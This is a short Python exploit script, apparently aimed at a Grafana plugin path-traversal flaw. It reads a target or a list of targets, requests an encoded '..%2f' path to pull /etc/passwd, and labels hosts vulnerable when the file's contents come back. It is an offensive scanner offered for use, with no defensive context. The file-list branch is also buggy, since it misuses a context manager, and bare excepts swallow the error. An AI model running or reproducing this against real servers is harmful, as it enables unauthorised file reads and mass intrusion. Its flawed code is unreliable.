import requests
import os
def exs(d) -> None:
    if os.path.isfile(d):
        with open(d,'r').read().splitlines() as x:
            for i in x:
                g(i)
    else:
        g(d)

def g(u) -> None:
    def zz(p) -> str:
        if 'http' in p:
            s = p.split('/')
            s = [z for z in s if not 'http' in z]
            return ''.join(s)
        return p
    try:
        s = requests.get(f"http://{zz(u)}/public/plugins/alertmanager/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd", verify=False, allow_redirects=False, timeout=10)
        if 'root' in s.text and '/bin/bash' in s.text:
            print(f"{u} vulnerable")
        else:
            print(f"{u} not vulnerable")
    except ConnectionError:
        exit()
    except:
        pass

if __name__ == '__main__':
    try:
        iz = input('File or target? ')
        exs(iz)
    except KeyboardInterrupt:
        exit()
    except:
        pass
